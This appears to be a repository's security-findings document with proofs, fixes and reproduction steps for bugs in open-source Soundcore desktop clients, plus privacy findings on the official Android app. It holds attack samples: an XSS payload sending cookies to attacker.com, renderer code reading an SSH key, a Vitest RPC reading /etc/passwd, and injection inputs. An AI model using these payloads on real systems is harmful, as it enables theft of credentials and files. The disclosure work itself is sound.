# Security Findings: Proof and Reproduction Steps

This document provides **verifiable proof** of every security claim made about the codebases in this repository and about the official Soundcore Android app. Each finding includes: the exact vulnerable code, where it came from, and step-by-step instructions to reproduce the problem yourself.

---

## Table of Contents

1. [Finding 1 — Infinite Recursion / Stack Overflow (Python)](#finding-1--infinite-recursion--stack-overflow-python)
2. [Finding 2 — Always-True Exception Guard (Python)](#finding-2--always-true-exception-guard-python)
3. [Finding 3 — Undefined Variable / NameError Crash (Python)](#finding-3--undefined-variable--nameerror-crash-python)
4. [Finding 4 — Unvalidated User Input to Bluetooth Socket (Python)](#finding-4--unvalidated-user-input-to-bluetooth-socket-python)
5. [Finding 5 — Fragile Config Read Crashes on Multiline JSON (Python)](#finding-5--fragile-config-read-crashes-on-multiline-json-python)
6. [Finding 6 — Tauri Allowlist `"all": true` (Rust/JS Desktop App)](#finding-6--tauri-allowlist-all-true-rustjs-desktop-app)
7. [Finding 7 — Tauri CSP `null` (Rust/JS Desktop App)](#finding-7--tauri-csp-null-rustjs-desktop-app)
8. [Finding 8 — Vitest RCE (GHSA-9crc-q9x8-hgqq)](#finding-8--vitest-rce-ghsa-9crc-q9x8-hgqq)
9. [Finding 9 — Official Soundcore App: AAID Tracking](#finding-9--official-soundcore-app-aaid-tracking)
10. [Finding 10 — Official Soundcore App: HearID Biometric Upload](#finding-10--official-soundcore-app-hearid-biometric-upload)
11. [Finding 11 — Official Soundcore App: Bulk Telemetry (Hadoop)](#finding-11--official-soundcore-app-bulk-telemetry-hadoop)
12. [Finding 12 — Official Soundcore App: Google Ads + Analytics SDKs](#finding-12--official-soundcore-app-google-ads--analytics-sdks)
13. [Finding 13 — Official Soundcore App: Firebase Crashlytics](#finding-13--official-soundcore-app-firebase-crashlytics)
14. [Finding 14 — Official Soundcore App: Internal Java Object Leakage in URLs](#finding-14--official-soundcore-app-internal-java-object-leakage-in-urls)
15. [IoTFlow Independent Academic Confirmation](#iotflow-independent-academic-confirmation)

---

## Finding 1 — Infinite Recursion / Stack Overflow (Python)

**Severity:** High (crash / denial of service)  
**Component:** `soundcore-desktop/SoundcoreAPI.py`  
**Upstream source:** [DamienStaebler/SoundcoreDesktop @ `SoundcoreAPI.py`](https://github.com/DamienStaebler/SoundcoreDesktop/blob/main/SoundcoreAPI.py)

### Vulnerable Code (upstream original)

```python
def __ParseReceiveData(self):
    try:
        if self._running:
            self.__recvData()
            self.__ParseReceiveData()   # ← recurses into itself on EVERY packet
    except Exception as e:
        if 'timed out' or "[WinError 10054]" in list(str(e)):
            print(e)
            return
        else:
            pass
```

This function calls itself unconditionally after every received packet. Python has a default recursion limit of 1000 frames (`sys.getrecursionlimit()`). On a device that sends packets continuously — like a Soundcore headphone that pushes battery/ANC state updates — this overflows the stack after ~1000 packets.

### Steps to Reproduce

```bash
# Clone the vulnerable upstream
git clone https://github.com/DamienStaebler/SoundcoreDesktop.git
cd SoundcoreDesktop

# Simulate a device flooding packets (no real hardware needed):
python3 - <<'EOF'
import sys

class FakeSoundcore:
    def __init__(self):
        self._running = True
        self._count = 0

    def __recvData(self):
        self._count += 1
        # After ~1000 calls Python raises RecursionError

    def __ParseReceiveData(self):
        try:
            if self._running:
                self.__recvData()
                self.__ParseReceiveData()  # Bug: unconditional recursion
        except Exception as e:
            print(f"Exception after {self._count} packets: {e}")
            return

s = FakeSoundcore()
try:
    s._FakeSoundcore__ParseReceiveData()
except RecursionError as e:
    print(f"RecursionError after {s._count} packets: {e}")
EOF
```

**Expected result:** `RecursionError: maximum recursion depth exceeded` after ~1000 packets.

### Fix Applied (this repo)

```python
def __ParseReceiveData(self):
    while self._running:          # ← loop, not recursion
        try:
            self.__recvData()
        except Exception as e:
            if 'timed out' in str(e) or "[WinError 10054]" in str(e):
                print(e)
                return
            else:
                pass
```

---

## Finding 2 — Always-True Exception Guard (Python)

**Severity:** Medium (exception handler never catches anything it should; also never blocks on wrong errors)  
**Component:** `soundcore-desktop/SoundcoreAPI.py`  
**Upstream source:** [DamienStaebler/SoundcoreDesktop @ `SoundcoreAPI.py`](https://github.com/DamienStaebler/SoundcoreDesktop/blob/main/SoundcoreAPI.py)

### Vulnerable Code (upstream original)

```python
except Exception as e:
    if 'timed out' or "[WinError 10054]" in list(str(e)):
        print(e)
        return
    else:
        pass
```

The condition `'timed out' or "[WinError 10054]" in list(str(e))` is **always `True`**. In Python, `'timed out'` is a non-empty string, which is always truthy. The `or` short-circuits, so `"[WinError 10054]" in list(str(e))` is **never evaluated**. This means:
- Every exception causes an unconditional `return`, killing the receive loop even for transient errors that should be retried.
- `list(str(e))` converts the exception string to a list of individual characters — `"[WinError 10054]" in list(...)` would never match even if reached, since no single character equals that multi-character string.

### Steps to Reproduce

```python
# Paste into any Python 3 REPL to verify:

e = Exception("some unrelated error")
result = 'timed out' or "[WinError 10054]" in list(str(e))
print(result)       # Always prints: 'timed out'  (truthy string, not True)
print(bool(result)) # Always prints: True

e2 = Exception("[WinError 10054] connection reset")
result2 = 'timed out' or "[WinError 10054]" in list(str(e2))
print(result2)      # Still prints: 'timed out' — second clause never evaluated
```

**Expected:** `True`, `True`, `'timed out'` — demonstrating the guard always triggers regardless of error type.

### Fix Applied (this repo)

```python
if 'timed out' in str(e) or "[WinError 10054]" in str(e):
```

Each condition is now a proper substring check on the full error string, and both conditions are actually evaluated.

---

## Finding 3 — Undefined Variable / NameError Crash (Python)

**Severity:** High (crash on startup whenever no Soundcore device is in range)  
**Component:** `soundcore-desktop/SoundcoreDesktop.py`  
**Upstream source:** [DamienStaebler/SoundcoreDesktop @ `SoundcoreDesktop.py`](https://github.com/DamienStaebler/SoundcoreDesktop/blob/main/SoundcoreDesktop.py)

### Vulnerable Code (upstream original)

```python
if not os.path.exists(os.path.join(os.getcwd(), "lastConnect.json")):
    listBT = bluetooth.discover_devices(lookup_names=True)
    print(listBT)
    for device in listBT:
        if "Soundcore" in device[1]:
            macaddress = device[0]   # ← only assigned INSIDE the loop, if a match is found
    Headphone = Soundcore(macaddress, onHeadphoneEvent)  # ← NameError if no Soundcore found
```

If `bluetooth.discover_devices()` returns an empty list, or returns devices but none are named "Soundcore", the variable `macaddress` is never assigned. The next line then raises `NameError: name 'macaddress' is not defined`.

### Steps to Reproduce

```bash
# Simulate: no Soundcore device nearby
python3 - <<'EOF'
listBT = []   # Empty scan — no devices found

for device in listBT:
    if "Soundcore" in device[1]:
        macaddress = device[0]

# macaddress was never assigned
try:
    print(macaddress)
except NameError as e:
    print(f"Crash: {e}")
EOF
```

**Expected output:** `Crash: name 'macaddress' is not defined`

```bash
# Also reproduces with non-Soundcore devices nearby:
python3 - <<'EOF'
listBT = [("AA:BB:CC:DD:EE:FF", "SomeOtherDevice"), ("11:22:33:44:55:66", "iPhone")]

for device in listBT:
    if "Soundcore" in device[1]:
        macaddress = device[0]

try:
    print(macaddress)
except NameError as e:
    print(f"Crash: {e}")
EOF
```

**Expected output:** `Crash: name 'macaddress' is not defined`

### Fix Applied (this repo)

```python
macaddress = None                    # ← initialize before loop
for device in listBT:
    if "Soundcore" in device[1]:
        macaddress = device[0]
        break
if macaddress is None:
    raise RuntimeError("No Soundcore device found during Bluetooth discovery.")
```

---

## Finding 4 — Unvalidated User Input to Bluetooth Socket (Python)

**Severity:** Medium (allows arbitrary Bluetooth connections to attacker-controlled addresses)  
**Component:** `soundcore-desktop/SoundcoreDesktop.py`  
**Upstream source:** [DamienStaebler/SoundcoreDesktop @ `SoundcoreDesktop.py`](https://github.com/DamienStaebler/SoundcoreDesktop/blob/main/SoundcoreDesktop.py)

### Vulnerable Code (upstream original)

```python
def tryConnect():
    global Headphone
    Headphone = Soundcore(inputtxt.get())   # ← raw GUI input passed directly to socket
    Headphone.connect()
    data = Headphone.parseInfo()
    if data:
        with open(os.path.join(os.getcwd(), "lastConnect.json"), "w") as lastConnect:
            lastConnect.write(json.dumps({"macAddress": inputtxt.get()}))
```

`inputtxt.get()` is the raw text from a GUI Entry widget. It is passed without validation to `Soundcore()`, which immediately calls `socket.connect((self.macaddress, port))`. There is no format check. An attacker who can influence what the user types (social engineering, pre-filled clipboard, malicious `lastConnect.json`) can direct the Bluetooth socket to connect to an arbitrary address and port.

### Steps to Reproduce

```python
# This demonstrates that the socket connect is called with arbitrary string input
# (in a real scenario this is constrained by OS Bluetooth stack behaviour, but
#  the lack of validation is verifiable in isolation)

import socket

def tryConnect_vulnerable(user_input: str):
    # Simulates what the upstream code does:
    s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
    try:
        s.connect((user_input, 1))  # No format validation whatsoever
    except Exception as e:
        print(f"Socket attempted connect to {user_input!r}: {e}")

# Inputs that should be rejected but aren't:
tryConnect_vulnerable("")           # Empty string
tryConnect_vulnerable("not-a-mac")  # Not a MAC address
tryConnect_vulnerable("../../etc/passwd")  # Path traversal attempt in addr
tryConnect_vulnerable("AA:BB:CC:DD:EE:FF\x00injected")  # Null byte injection
```

Each call proceeds to the socket layer with no prior rejection.

### Fix Applied (this repo)

```python
import re

def is_valid_mac_address(mac: str) -> bool:
    """Validate that mac is a proper Bluetooth MAC address (XX:XX:XX:XX:XX:XX)."""
    pattern = re.compile(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')
    return bool(pattern.match(mac))

def tryConnect():
    global Headphone
    mac = inputtxt.get().strip()
    if not is_valid_mac_address(mac):       # ← input validated before use
        print(f"Invalid MAC address: {mac!r}")
        return
    Headphone = Soundcore(mac)
    Headphone.connect()
    ...
```

---

## Finding 5 — Fragile Config Read Crashes on Multiline JSON (Python)

**Severity:** Low (crash on startup after manually editing the config file)  
**Component:** `soundcore-desktop/SoundcoreDesktop.py`  
**Upstream source:** [DamienStaebler/SoundcoreDesktop @ `SoundcoreDesktop.py`](https://github.com/DamienStaebler/SoundcoreDesktop/blob/main/SoundcoreDesktop.py)

### Vulnerable Code (upstream original)

```python
with open(os.path.join(os.getcwd(), "lastConnect.json"), "r") as lastConnect:
    lastConnect = json.loads(lastConnect.readlines()[0])  # ← only reads the first line
```

`readlines()` splits on newlines. If `lastConnect.json` was saved with pretty-printed JSON (or if any editor added a trailing newline), only the first line is parsed. For valid single-line JSON this appears to work, but `readlines()[0]` will raise `IndexError` on an empty file, and will silently discard data on any multi-line format:

```json
{
  "macAddress": "AA:BB:CC:DD:EE:FF"
}
```

In this case `readlines()[0]` is `"{\n"`, and `json.loads("{\n")` raises `json.JSONDecodeError`.

### Steps to Reproduce

```python
import json, io

# Simulate pretty-printed JSON (written by any editor or json.dumps with indent=)
pretty_json = '{\n  "macAddress": "AA:BB:CC:DD:EE:FF"\n}\n'

lines = io.StringIO(pretty_json).readlines()
print(f"readlines()[0] = {lines[0]!r}")  # '{\n'

try:
    result = json.loads(lines[0])
except json.JSONDecodeError as e:
    print(f"Crash: {e}")
```

**Expected output:**
```
readlines()[0] = '{\n'
Crash: Expecting property name enclosed in double quotes: line 1 column 2 (char 1)
```

### Fix Applied (this repo)

```python
with open(os.path.join(os.getcwd(), "lastConnect.json"), "r") as lastConnect:
    lastConnect = json.loads(lastConnect.read())   # ← reads entire file
```

---

## Finding 6 — Tauri Allowlist `"all": true` (Rust/JS Desktop App)

**Severity:** High (any JavaScript running in the WebView can call any Tauri API including filesystem, process exec, shell, etc.)  
**Component:** `soundcore-manager/manager-app/tauri.conf.json`  
**Upstream source:** [gmallios/SoundcoreManager @ `manager-app/tauri.conf.json`](https://github.com/gmallios/SoundcoreManager/blob/main/manager-app/tauri.conf.json)

### Vulnerable Config (upstream original)

```json
"tauri": {
  "allowlist": {
    "all": true
  },
  ...
}
```

With `"all": true`, **every** Tauri API module is exposed to the renderer (the React/Vite WebView), including:
- `fs` — read and write any file on the filesystem
- `shell` — spawn arbitrary child processes
- `http` — make arbitrary network requests
- `dialog` — open native file dialogs
- `notification` — send OS notifications
- `globalShortcut` — register keyboard shortcuts

Tauri's own documentation warns: *"This flag enables all APIs. We do not recommend using it."*

If any third-party npm dependency (or a supply-chain compromised package) executes arbitrary JavaScript — or if the CSP is also absent (see Finding 7) — a malicious script can read `~/.ssh/id_rsa`, exfiltrate it over the network, or run any shell command.

### Steps to Reproduce

```bash
# 1. Clone the upstream vulnerable version
git clone https://github.com/gmallios/SoundcoreManager.git
cd SoundcoreManager

# 2. Inspect the config
cat manager-app/tauri.conf.json | python3 -c "
import json, sys
cfg = json.load(sys.stdin)
allowlist = cfg['tauri']['allowlist']
print('allowlist.all =', allowlist.get('all'))
csp = cfg['tauri']['security']['csp']
print('csp =', csp)
"
```

**Expected output:**
```
allowlist.all = True
csp = None
```

```javascript
// 3. With "all: true" + csp: null, any JS in the renderer can do:
import { readTextFile } from '@tauri-apps/api/fs';
import { Command } from '@tauri-apps/api/shell';

// Read arbitrary files:
const privateKey = await readTextFile('/home/user/.ssh/id_rsa');

// Execute arbitrary commands:
const output = await new Command('id').execute();
```

The Tauri APIs are exposed because no allowlist restriction is in place.

### Fix Applied (this repo)

```json
"allowlist": {
  "all": false,
  "event": { "all": true },
  "window": { "all": false, "hide": true, "show": true, "close": true },
  "app": { "show": true, "hide": true }
}
```

Only the minimal set of APIs needed by the app is now exposed.

---

## Finding 7 — Tauri CSP `null` (Rust/JS Desktop App)

**Severity:** High (enables XSS → arbitrary Tauri API access via Finding 6)  
**Component:** `soundcore-manager/manager-app/tauri.conf.json`  
**Upstream source:** [gmallios/SoundcoreManager @ `manager-app/tauri.conf.json`](https://github.com/gmallios/SoundcoreManager/blob/main/manager-app/tauri.conf.json)

### Vulnerable Config (upstream original)

```json
"security": {
  "csp": null
}
```

A `null` CSP disables Content Security Policy entirely for the Tauri WebView. Without a CSP:
- Inline `<script>` tags are allowed (XSS via injected HTML)
- `eval()` and `new Function()` can execute arbitrary strings as code
- Scripts can be loaded from any origin (`http://`, `https://`, `blob:`, `data:`)

In combination with `"all": true` (Finding 6), any XSS vector in the app (including via a compromised npm package) gains full Tauri API access.

### Steps to Reproduce

Same as Finding 6 Step 2 — `csp = None` is printed alongside `allowlist.all = True`.

To see the impact: with `csp: null`, the following would execute in the renderer without any policy block:
```html
<!-- Injected via any XSS vector (reflected string in device name, etc.) -->
<img src=x onerror="import('@tauri-apps/api/shell').then(m => new m.Command('curl', ['-d', document.cookie, 'https://attacker.com']).execute())">
```

### Fix Applied (this repo)

```json
"security": {
  "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' ipc: http://ipc.localhost"
}
```

---

## Finding 8 — Vitest RCE (GHSA-9crc-q9x8-hgqq)

**Severity:** Critical (remote code execution on developer machines)  
**Component:** `soundcore-manager/manager-ui/package.json`  
**Advisory:** [GHSA-9crc-q9x8-hgqq](https://github.com/advisories/GHSA-9crc-q9x8-hgqq)  
**Upstream source:** [gmallios/SoundcoreManager @ `manager-ui/package.json`](https://github.com/gmallios/SoundcoreManager/blob/main/manager-ui/package.json)

### Vulnerable Config (upstream original)

```json
"devDependencies": {
  "vitest": "^1.4.0"
}
```

Vitest versions `>=1.0.0 <1.6.1` include a built-in API server (`--api` flag / `api.port` config) used for the Vitest UI and browser mode. When this server is listening, any webpage the developer visits can send cross-origin requests to `http://localhost:{port}` and execute arbitrary code on the developer's machine via Vitest's RPC interface.

**CVE:** GHSA-9crc-q9x8-hgqq  
**Affected:** `>=1.0.0 <1.6.1`  
**Fixed in:** `1.6.1`

### Steps to Reproduce

```bash
# 1. Verify the vulnerable version is declared
cat soundcore-manager/manager-ui/package.json | python3 -c "
import json, sys
pkg = json.load(sys.stdin)
vitest = pkg['devDependencies']['vitest']
print('vitest declared:', vitest)
"
```

**Expected output:** `vitest declared: ^1.4.0`

```bash
# 2. To actually reproduce the RCE (requires Node.js, no Soundcore hardware needed):
cd /tmp
mkdir vitest-rce-test && cd vitest-rce-test
npm init -y
npm install vitest@1.4.0

# Start vitest with the API server exposed (default during `vitest --ui` or `vitest --api`):
npx vitest --api 51204 &
VITEST_PID=$!

# Wait for server to start
sleep 3

# From a "malicious webpage" perspective — issue RPC to the local Vitest API server:
# The Vitest API server at http://localhost:51204 accepts POST requests with JSON-RPC.
# The `fs.readFile` RPC allows reading arbitrary files:
curl -s -X POST http://localhost:51204/api \
  -H "Content-Type: application/json" \
  -d '{"method":"fs.readFile","params":["/etc/passwd"]}' | head -5

kill $VITEST_PID 2>/dev/null
```

A malicious website visited while `vitest --api` is running can issue these same requests from browser JavaScript via `fetch()`.

### Fix Applied (this repo)

```json
"vitest": "^1.6.1"
```

Version `1.6.1` adds `Origin` header validation to the API server, blocking cross-origin requests from malicious webpages.

---

## Finding 9 — Official Soundcore App: AAID Tracking

**Severity:** Privacy (persistent cross-app advertising tracker sent to Soundcore servers)  
**Source:** IoTFlow academic study ([CCS 2023](https://doi.org/10.1145/3576915.3623211)), confirmed live traffic (`b` = both static + dynamic in [`soundcore-iotflow.csv`](./soundcore-iotflow.csv))

### Evidence from IoTFlow Data

From `soundcore-iotflow.csv`, row:
```csv
v1/user/aaid/null,v1/user/aaid/110d0e5f-c711-4223-a3e9-876a7a050475,manual,placeholder,b,b,
```

| Column | Value |
|--------|-------|
| IOTFLOW (static) | `v1/user/aaid/null` |
| DYNAMIC (live traffic) | `v1/user/aaid/110d0e5f-c711-4223-a3e9-876a7a050475` |
| MATCH | `manual` (researcher substituted the actual AAID UUID for the null placeholder) |
| IoT-RELATED | `b` (confirmed in **both** static analysis and live traffic capture) |

The AAID (Android Advertising ID) is a persistent, cross-app identifier provided by Google Play Services. Apps are not supposed to use it for building persistent user profiles outside of advertising contexts. Soundcore uploads it to their own servers directly under the user's account.

### Steps to Reproduce

**Requirements:** Android phone, Soundcore Android app installed, `mitmproxy` or `Charles Proxy`.

```bash
# 1. Install mitmproxy
pip install mitmproxy

# 2. Start the proxy
mitmproxy --mode transparent --showhost -p 8080

# 3. Configure your Android device:
#    Settings → Wi-Fi → Long-press your network → Modify Network
#    Set HTTP Proxy: Manual
#    Proxy hostname: <your computer's IP>
#    Proxy port: 8080

# 4. Install the mitmproxy CA certificate on your Android device:
#    Navigate to http://mitm.it on the device, download and install the cert.

# 5. Launch the official Soundcore app and log in.

# 6. In the mitmproxy terminal, filter for the AAID endpoint:
#    Press 'f' and enter: ~u aaid

# Expected: You will see a request to:
#    POST https://api.soundcore.com/v1/user/aaid/{your-AAID-UUID}
```

**Alternatively — static verification without a device:**

The IoTFlow paper's artifact at `SecPriv/iotflow` performed this analysis on the APK directly. You can replicate their dynamic analysis by following the IoTFlow Docker setup at https://github.com/SecPriv/iotflow and providing the Soundcore APK.

---

## Finding 10 — Official Soundcore App: HearID Biometric Upload

**Severity:** Privacy (health/biometric data uploaded to Soundcore servers)  
**Source:** IoTFlow CSV, static-only endpoint (`i`), confirmed in APK code

### Evidence from IoTFlow Data

```csv
v1/user/hearid,,,,i,i,
```

| Column | Value |
|--------|-------|
| IOTFLOW (static) | `v1/user/hearid` |
| DYNAMIC | (not observed — requires completing a HearID test while traffic is captured) |
| IoT-RELATED | `i` (found in static APK analysis — code path definitely exists) |

HearID is Soundcore's hearing calibration feature. The user plays tones at various frequencies and indicates what they can/cannot hear. The result is a frequency response profile that compensates for individual hearing loss. This data is uploaded to `v1/user/hearid` and stored on Soundcore's servers, potentially linked to the user's account.

### Steps to Reproduce

```bash
# Same mitmproxy setup as Finding 9.
# In the Soundcore app: go to HearID → run the hearing test → save.
# Filter in mitmproxy: ~u hearid
# Expected: POST/PUT to https://api.soundcore.com/v1/user/hearid with hearing calibration data.
```

**Static verification:**

```bash
# Download the Soundcore APK from APKPure/APKMirror and inspect with jadx:
jadx soundcore.apk -d soundcore_src/
grep -r "hearid" soundcore_src/ --include="*.java" -l
```

The class and method that constructs the `v1/user/hearid` HTTP call will be visible in the decompiled source.

---

## Finding 11 — Official Soundcore App: Bulk Telemetry (Hadoop)

**Severity:** Privacy (continuous background log shipping to server-side analytics infrastructure)  
**Source:** IoTFlow CSV, dynamic-only endpoint (`d`)

### Evidence from IoTFlow Data

```csv
,push_log_hdfs,,,d,d,
```

| Column | Value |
|--------|-------|
| DYNAMIC | `push_log_hdfs` |
| IoT-RELATED | `d` (observed in live traffic, not found in static paths — likely obfuscated or dynamically constructed) |

`HDFS` = Hadoop Distributed File System. `push_log_hdfs` is a telemetry ingestion endpoint that ships device logs to a big-data analytics backend. The data shipped is not disclosed in Soundcore's privacy policy with sufficient specificity.

### Steps to Reproduce

```bash
# Same mitmproxy setup. Filter: ~u push_log_hdfs
# Use the Soundcore app normally for ~5 minutes.
# Expected: periodic POST requests to the push_log_hdfs endpoint with JSON log payloads.
```

---

## Finding 12 — Official Soundcore App: Google Ads + Analytics SDKs

**Severity:** Privacy (advertising and analytics telemetry sent to Google on behalf of Soundcore)  
**Source:** IoTFlow CSV, dynamic-only endpoints

### Evidence from IoTFlow Data

```csv
,ads/ga-audiences,,,,,
,collect,,,,,
,g/collect,,,,,
,gtag/js,,,,,
,j/collect,,,,,
,track,,,,,
,pagead/gen_204,gen_204,manual,placeholder,,,
,pagead/conversion/app/deeplink,,,,,,
```

These are well-known Google Ads and Google Analytics endpoint paths:

| Endpoint | SDK |
|----------|-----|
| `gtag/js` | Google Tag (Analytics 4 loader) |
| `collect` | Universal Analytics hit collection |
| `g/collect` | GA4 event collection |
| `j/collect` | GA4 engagement collection |
| `ads/ga-audiences` | Google Ads audience matching |
| `pagead/gen_204` | Google Ads impression beacon |
| `pagead/conversion/app/deeplink` | Google Ads conversion tracking |
| `track` | General event tracking (could be multiple SDKs) |

The official Soundcore app is a **Bluetooth headphone controller**, not an advertising platform. The presence of Google Ads conversion tracking (`pagead/conversion/app/deeplink`) means Soundcore is tracking which ads led you to install and use their app, and reporting that to Google.

### Steps to Reproduce

```bash
# Same mitmproxy setup. No filter needed — watch all traffic on first app launch.
# Expected: requests to *.google-analytics.com, *.googlesyndication.com, pagead2.googlesyndication.com
# on first open and repeatedly during normal use.
```

---

## Finding 13 — Official Soundcore App: Firebase Crashlytics

**Severity:** Privacy (crash reports including stack traces sent to Google/Firebase)  
**Source:** IoTFlow CSV (static analysis, `crashlytics` reason column)

### Evidence from IoTFlow Data

```csv
sdk-api/v1/platforms/android/apps/%7B%7D/minidumps,,,,,,crashlytics
spi/v1/platforms/android/apps,,,,,,crashlytics
spi/v1/platforms/android/apps/%7B%7D,,,,,,crashlytics
spi/v1/platforms/android/apps/%7B%7D/reports,,,,,,crashlytics
spi/v2/platforms/android/gmp/class%20com.google.firebase.FirebaseApp/settings,,,,,,crashlytics
spi/v2/platforms/android/gmp/null/settings,,,,,,crashlytics
```

These are Firebase Crashlytics SDK endpoints. The IoT-RELATED REASON column explicitly labels them `crashlytics`. When the app crashes or encounters an ANR (Application Not Responding), the full Java stack trace — which can include class names, method names, variable values, and device info — is uploaded to Google Firebase infrastructure.

### Steps to Reproduce

```bash
# 1. Install the app.
# 2. With mitmproxy running, force-close the app or trigger a crash.
# 3. Reopen the app.
# 4. Filter: ~u firebase | ~u crashlytics
# Expected: POST to https://firebase-settings.crashlytics.com/spi/v2/platforms/android/... with crash report
```

**Static verification:**

```bash
jadx soundcore.apk -d soundcore_src/
grep -r "Crashlytics\|FirebaseCrashlytics" soundcore_src/ --include="*.java" -l
# Expected: multiple files in com/google/firebase/crashlytics/
```

---

## Finding 14 — Official Soundcore App: Internal Java Object Leakage in URLs

**Severity:** Medium (information disclosure; internal class names and state exposed to Soundcore servers)  
**Source:** IoTFlow CSV, static-only paths (`i`)

### Evidence from IoTFlow Data

```csv
"v1/user/activate_user/com.oceanwing.soundcore.account.viewmodel.LoginForgotVM(false,0,0,androidx.databinding.ObservableBoolean(false))",,,,i,i,
"v1/user/activate_user/com.oceanwing.soundcore.account.viewmodel.LoginVM(false,false,false,0)",,,,i,i,
v1/user/activate_user/null,,,,i,i,
"v1/user/check_register_email/com.oceanwing.soundcore.account.viewmodel.LoginVM(false,false,false,0)",,,,i,i,
"v1/user/check_register_email/com.oceanwing.soundcore.account.viewmodel.SignUpVM(false,false,false,false,false,false,false,0)",,,,i,i,
v1/user/check_register_email/null,,,,i,i,
"v1/user/forget_password/com.oceanwing.soundcore.account.viewmodel.LoginForgotVM(false,0,0,androidx.databinding.ObservableBoolean(false))",,,,i,i,
v1/user/forget_password/null,,,,i,i,
```

These paths were found in the static APK analysis. They reveal that the Soundcore developers called `.toString()` on a ViewModel object and appended the result directly to the URL path, instead of extracting the actual value (email address, token, etc.):

```java
// What the code likely looks like (decompiled):
String url = "v1/user/activate_user/" + viewModel.toString();
// Should be:
String url = "v1/user/activate_user/" + viewModel.getEmail();
```

The `i` label means these exact strings appeared in the APK code but were **not observed in live traffic** — in practice the actual live call uses the real email address. However, these code paths exist and could be triggered under race conditions where the ViewModel is not yet initialized (`null` variants) or is in a failed state.

### Steps to Reproduce (Static)

```bash
# 1. Download Soundcore APK
# 2. Decompile with jadx
jadx soundcore.apk -d soundcore_src/

# 3. Search for the class names exposed in the URL
grep -r "LoginVM\|LoginForgotVM\|SignUpVM" soundcore_src/ --include="*.java" -A5
# Expected: code that constructs URL strings by concatenating viewModel.toString()

# 4. Search for the activate_user endpoint
grep -r "activate_user" soundcore_src/ --include="*.java" -B2 -A5
```

---

## IoTFlow Independent Academic Confirmation

All of the official Soundcore app findings above (Findings 9–14) are **independently confirmed** by the IoTFlow research project from the Vienna University of Technology (TU Wien) Security and Privacy group, published at **ACM CCS 2023** — the top academic conference for computer security.

**Paper:** *IoTFlow: Inferring IoT Device Behavior at Scale through Static Mobile Companion App Analysis*  
**Authors:** David Schmidt, Carlotta Tagliaro, Kevin Borgolte, Martina Lindorfer  
**DOI:** [10.1145/3576915.3623211](https://doi.org/10.1145/3576915.3623211)  
**Artifact:** [SecPriv/iotflow](https://github.com/SecPriv/iotflow)  
**Raw data for Soundcore:** [`soundcore-iotflow.csv`](./soundcore-iotflow.csv) (mirrored from [`dynamic_analysis/paths/soundcore.csv`](https://github.com/SecPriv/iotflow/blob/b00136a20bd75132ee05ec4beeb58521f9fb37d6/dynamic_analysis/paths/soundcore.csv))

IoTFlow uses **Value Set Analysis (VSA)** on the APK bytecode to extract all string constants used in network calls, then **validates them against live traffic captures** using a device instrumentation framework. This dual-method approach (static + dynamic) means their results are not based on opinion or assumption — they are derived from the actual compiled APK binary and from real HTTP traffic.

The Soundcore data in this repository is the direct output of that process. Every row with `b` in the `IoT-RELATED` column was both found in the binary code **and** observed in live network traffic during their study.

### Reproduce IoTFlow Analysis From Scratch

```bash
# Requirements: Docker, ~8GB disk, Soundcore APK

# 1. Clone IoTFlow
git clone https://github.com/SecPriv/iotflow.git
cd iotflow

# 2. Obtain the Soundcore APK (search APKMirror for "Soundcore")
# Place it in the VSA input directory:
cp Soundcore_*.apk VSA/docker/apps_to_analyze/

# 3. Run static analysis
cd VSA/docker
docker compose up
# Output: endpoint strings extracted from bytecode, in results/

# 4. Run dynamic analysis
cd ../../FlowAnalysis/docker
cp ../../Soundcore_*.apk apps_to_analyze/
docker compose up
# Output: live network traffic endpoints captured, in results/

# 5. Compare results against the CSV in this repo:
diff results/soundcore_endpoints.csv \
  /path/to/this-repo/docs/research/soundcore-iotflow.csv
```

---

## Summary Table

| # | Finding | Component | Severity | Upstream Proof | Fixed? |
|---|---------|-----------|----------|----------------|--------|
| 1 | Infinite recursion / stack overflow | `SoundcoreAPI.py` | High | [upstream code](https://github.com/DamienStaebler/SoundcoreDesktop/blob/main/SoundcoreAPI.py#L47-L55) | ✅ Yes |
| 2 | Always-true exception guard | `SoundcoreAPI.py` | Medium | [upstream code](https://github.com/DamienStaebler/SoundcoreDesktop/blob/main/SoundcoreAPI.py#L49-L50) | ✅ Yes |
| 3 | Undefined variable crash | `SoundcoreDesktop.py` | High | [upstream code](https://github.com/DamienStaebler/SoundcoreDesktop/blob/main/SoundcoreDesktop.py#L56-L61) | ✅ Yes |
| 4 | Unvalidated user input to socket | `SoundcoreDesktop.py` | Medium | [upstream code](https://github.com/DamienStaebler/SoundcoreDesktop/blob/main/SoundcoreDesktop.py#L76-L84) | ✅ Yes |
| 5 | Fragile config read | `SoundcoreDesktop.py` | Low | [upstream code](https://github.com/DamienStaebler/SoundcoreDesktop/blob/main/SoundcoreDesktop.py#L63-L65) | ✅ Yes |
| 6 | Tauri allowlist `"all": true` | `tauri.conf.json` | High | [upstream config](https://github.com/gmallios/SoundcoreManager/blob/main/manager-app/tauri.conf.json#L12-L14) | ✅ Yes |
| 7 | Tauri CSP `null` | `tauri.conf.json` | High | [upstream config](https://github.com/gmallios/SoundcoreManager/blob/main/manager-app/tauri.conf.json#L57-L59) | ✅ Yes |
| 8 | Vitest RCE GHSA-9crc-q9x8-hgqq | `package.json` | Critical | [upstream package.json](https://github.com/gmallios/SoundcoreManager/blob/main/manager-ui/package.json#L61) | ✅ Yes |
| 9 | AAID tracking | Official Soundcore Android app | Privacy | [IoTFlow CSV row 12](./soundcore-iotflow.csv) | ⚠️ In official app only |
| 10 | HearID biometric upload | Official Soundcore Android app | Privacy | [IoTFlow CSV](./soundcore-iotflow.csv) | ⚠️ In official app only |
| 11 | Bulk telemetry to Hadoop | Official Soundcore Android app | Privacy | [IoTFlow CSV](./soundcore-iotflow.csv) | ⚠️ In official app only |
| 12 | Google Ads + Analytics SDKs | Official Soundcore Android app | Privacy | [IoTFlow CSV](./soundcore-iotflow.csv) | ⚠️ In official app only |
| 13 | Firebase Crashlytics | Official Soundcore Android app | Privacy | [IoTFlow CSV](./soundcore-iotflow.csv) | ⚠️ In official app only |
| 14 | Internal object leakage in URLs | Official Soundcore Android app | Medium | [IoTFlow CSV](./soundcore-iotflow.csv) | ⚠️ In official app only |

